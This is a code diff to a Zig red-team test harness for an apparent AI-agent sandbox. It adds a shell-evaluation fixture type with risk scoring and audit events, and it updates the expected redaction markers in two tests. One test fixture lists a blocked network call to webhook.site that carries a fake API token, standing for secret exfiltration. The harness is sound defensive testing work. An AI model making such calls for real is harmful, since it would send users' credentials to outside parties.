@@ -6,6 +6,7 @@ const intercept = @import("../intercept/mod.zig");
 const mcp = @import("../mcp/mod.zig");
 const policy = @import("ryk_core").policy;
 const sandbox = @import("../sandbox/mod.zig");
+const shell_engine = @import("../shell_engine/mod.zig");
 const brand = @import("../cli/brand.zig");
 const fixtures = @import("fixtures.zig");
 const scorecard = @import("scorecard.zig");
@@ -361,6 +362,7 @@ fn runAttempt(
         .file_read => runFileRead(allocator, attempt, selected_policy, workspace_root, writer),
         .symlink_read => runSymlinkRead(allocator, attempt, selected_policy, workspace_root, temp_root, writer),
         .command_exec => runCommand(allocator, effective_mode, attempt, selected_policy, writer),
+        .shell_eval => runShellEval(allocator, attempt, writer),
         .network_connect => runNetwork(allocator, effective_mode, attempt, selected_policy, writer),
         .mcp_tool => runMcpTool(allocator, effective_mode, attempt, selected_policy, writer),
         .mcp_metadata => runMcpMetadata(allocator, attempt, writer),
@@ -426,6 +428,40 @@ fn runCommand(
         try appendEvent(writer, .command_allowed, .command, attempt.value, decision.decision);
     }
     return observation(allocator, attempt, if (decision.decision.result == .deny) "command_denied" else "command_allowed", decision.decision.result.toString(), decision.decision.reason);
+}
+
+/// `shell.eval:` drives the Zig shell engine directly (the same entry point the
+/// hook/shim path uses), so fixtures can pin segmentation/substitution
+/// regressions that `command.exec:` (argv tokenization) cannot express.
+fn runShellEval(
+    allocator: std.mem.Allocator,
+    attempt: fixtures.Attempt,
+    writer: *audit.writer.SessionWriter,
+) !Observation {
+    var eval = try shell_engine.evaluateCommand(allocator, attempt.value, .{
+        .default_packs_only = true,
+    });
+    defer eval.deinit(allocator);
+    const denied = eval.decision == .deny;
+    const decision: core.decision.Decision = .{
+        .result = if (denied) .deny else .allow,
+        .reason = eval.reason,
+        .risk_score = switch (eval.severity) {
+            .critical => 95,
+            .high => 80,
+            .medium => 50,
+            .low => 20,
+        },
+        .requires_user = false,
+        .ci_may_proceed = !denied,
+    };
+    try appendEvent(writer, .command_attempt, .command, attempt.value, decision);
+    if (denied) {
+        try appendEvent(writer, .command_denied, .command, attempt.value, decision);
+    } else {
+        try appendEvent(writer, .command_allowed, .command, attempt.value, decision);
+    }
+    return observation(allocator, attempt, if (denied) "command_denied" else "command_allowed", decision.result.toString(), eval.reason);
 }
 
 fn runNetwork(
@@ -816,7 +852,7 @@ test "redteam redaction expectations must come from actual fixture output" {
         \\  - "file.read:README.md"
         \\expected:
         \\  redacted:
-        \\    - "[REDACTED:env:IMPOSSIBLE:sha256:"
+        \\    - "[REDACTED:env:IMPOSSIBLE]"
         \\score:
         \\  points: 1
         \\
@@ -844,7 +880,7 @@ test "redteam network fixture proves actual URL redaction marker" {
         \\  blocked:
         \\    - "network.connect:https://webhook.site/collect?token=sk-fakeSyntheticOpenAIKey1234567890"
         \\  redacted:
-        \\    - "[REDACTED:env:token:sha256:"
+        \\    - "[REDACTED:env:token]"
         \\  no_log_contains:
         \\    - "sk-fakeSyntheticOpenAIKey1234567890"
         \\
